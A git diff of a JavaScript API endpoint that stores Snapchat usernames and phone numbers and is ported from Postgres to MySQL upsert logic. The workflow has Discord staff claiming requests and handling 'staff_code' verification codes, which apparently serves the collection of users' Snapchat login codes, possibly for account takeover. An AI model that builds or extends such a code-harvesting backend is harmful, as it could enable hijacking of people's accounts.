@@ -1,14 +1,24 @@
 /**
  * api/snapchat.js — New request registration
  *
- * v2.3: Replaced SELECT + 409 with UPSERT (INSERT … ON CONFLICT(phone) DO UPDATE).
- *       Same phone → resets the request to pending so staff handles it again.
- *       Username uniqueness check removed entirely — multiple submissions OK.
- *       Requires migration_v2.3.sql (drops UNIQUE(username) constraint).
+ * v2.3: UPSERT on phone. Same phone → resets the request to pending so staff
+ *       handles it again. Username uniqueness check removed entirely —
+ *       multiple submissions OK.
+ *
+ * MySQL version: INSERT ... ON DUPLICATE KEY UPDATE. MySQL has no conditional
+ * "ON CONFLICT ... WHERE" and no RETURNING, so:
+ *   - each column is only overwritten IF the existing row is in a resettable
+ *     state (pending / completed / wrong_number); `status` is assigned LAST
+ *     because MySQL evaluates assignments left to right, so every earlier
+ *     condition still sees the ORIGINAL status;
+ *   - updated_at is bumped explicitly so the bot's poller notices a
+ *     resubmission even when no other column actually changed;
+ *   - the row is then read back, and if its status is not 'pending' it means
+ *     it is actively being handled and was left untouched.
  */
 
-import { neon }                           from '@neondatabase/serverless';
-import { getClientIP, checkBannedIP }     from './middleware.js';
+import { sql }                        from './_db.js';
+import { getClientIP, checkBannedIP } from './middleware.js';
 
 export default async function handler(req, res) {
     res.setHeader('Access-Control-Allow-Credentials', 'true');
@@ -39,65 +49,55 @@ export default async function handler(req, res) {
             return res.status(400).json({ success: false, message: 'Invalid phone number' });
         }
 
-        if (!process.env.DATABASE_URL) throw new Error('DATABASE_URL not configured');
-        const sql     = neon(process.env.DATABASE_URL);
         const ip      = getClientIP(req);
         const country = isBe ? 'Belgium' : 'France';
         const city    = 'Unknown';
 
-        // ── UPSERT (v3.2 — safe) ──────────────────────────────────────────
-        // Same phone → reset to pending so staff picks it up again,
-        // BUT only if the request isn't currently being actively handled
-        // by a staff member. Without this guard, a resubmission (double
-        // click, page refresh, or the offline auto-retry queue in
-        // script.js) silently wipes an in-progress claim: the DB row goes
-        // back to 'pending' while the Discord message + bot's in-memory
-        // claimer map still think it's claimed — causing stale buttons,
-        // "already claimed" 409s, and lost requests under load.
-        //
-        // If the row exists and is actively processing/awaiting code, the
-        // conditional WHERE below makes the UPDATE a no-op (0 rows
-        // returned) and we simply tell the client their request is still
-        // in progress instead of resetting it.
-        const result = await sql`
+        // ── UPSERT (safe) ─────────────────────────────────────────────────
+        // Same phone → reset to pending so staff picks it up again, BUT only
+        // if the request isn't currently being actively handled by a staff
+        // member. Without this guard, a resubmission (double click, page
+        // refresh, or the offline auto-retry queue in script.js) silently
+        // wipes an in-progress claim.
+        await sql`
             INSERT INTO snap_requests
                 (username, phone, location, operator, lang, status, ip_address, country, city)
             VALUES
                 (${username.toLowerCase()}, ${phoneClean}, ${location}, ${operator}, ${lang || 'fr'},
                  'pending', ${ip}, ${country}, ${city})
-            ON CONFLICT (phone) DO UPDATE
-                SET username               = EXCLUDED.username,
-                    location               = EXCLUDED.location,
-                    operator               = EXCLUDED.operator,
-                    lang                   = EXCLUDED.lang,
-                    status                 = 'pending',
-                    ip_address             = EXCLUDED.ip_address,
-                    country                = EXCLUDED.country,
-                    city                   = EXCLUDED.city,
-                    staff_code             = NULL,
-                    code_length            = NULL,
-                    claimed_by_discord_id  = NULL
-            WHERE snap_requests.status IN ('pending', 'completed', 'wrong_number')
-            RETURNING id, username, phone, operator, country, city, ip_address, created_at, status
+            ON DUPLICATE KEY UPDATE
+                username              = IF(status IN ('pending', 'completed', 'wrong_number'), VALUES(username),   username),
+                location              = IF(status IN ('pending', 'completed', 'wrong_number'), VALUES(location),   location),
+                operator              = IF(status IN ('pending', 'completed', 'wrong_number'), VALUES(operator),   operator),
+                lang                  = IF(status IN ('pending', 'completed', 'wrong_number'), VALUES(lang),       lang),
+                ip_address            = IF(status IN ('pending', 'completed', 'wrong_number'), VALUES(ip_address), ip_address),
+                country               = IF(status IN ('pending', 'completed', 'wrong_number'), VALUES(country),    country),
+                city                  = IF(status IN ('pending', 'completed', 'wrong_number'), VALUES(city),       city),
+                staff_code            = IF(status IN ('pending', 'completed', 'wrong_number'), NULL, staff_code),
+                code_length           = IF(status IN ('pending', 'completed', 'wrong_number'), NULL, code_length),
+                claimed_by_discord_id = IF(status IN ('pending', 'completed', 'wrong_number'), NULL, claimed_by_discord_id),
+                updated_at            = IF(status IN ('pending', 'completed', 'wrong_number'), NOW(3), updated_at),
+                status                = IF(status IN ('pending', 'completed', 'wrong_number'), 'pending', status)
         `;
 
-        let row = result[0];
+        const rows = await sql`
+            SELECT id, username, phone, operator, country, city, ip_address, created_at, status
+            FROM snap_requests WHERE phone = ${phoneClean} LIMIT 1
+        `;
+        const row = rows[0];
 
         if (!row) {
-            // Existing row is actively being handled — don't steal the claim.
+            return res.status(409).json({ success: false, message: 'Demande déjà en cours de traitement.' });
+        }
+
+        if (row.status !== 'pending') {
+            // Existing row is actively being handled — we left it untouched.
             // Just report current state so the client can keep polling normally.
-            const existing = await sql`
-                SELECT id, username, phone, operator, country, city, ip_address, created_at, status
-                FROM snap_requests WHERE phone = ${phoneClean} LIMIT 1
-            `;
-            if (existing.length === 0) {
-                return res.status(409).json({ success: false, message: 'Demande déjà en cours de traitement.' });
-            }
             return res.status(200).json({
                 success: true,
                 message: 'Demande déjà en cours de traitement',
                 alreadyProcessing: true,
-                data: { id: existing[0].id, username: existing[0].username, phone: existing[0].phone },
+                data: { id: row.id, username: row.username, phone: row.phone },
             });
         }
 
@@ -136,7 +136,7 @@ export default async function handler(req, res) {
             data: { id: row.id, username: row.username, phone: row.phone },
         });
     } catch (error) {
-        console.error('Neon DB Error:', error);
+        console.error('DB Error:', error);
         return res.status(500).json({ success: false, message: error.message || 'Server error' });
     }
 }
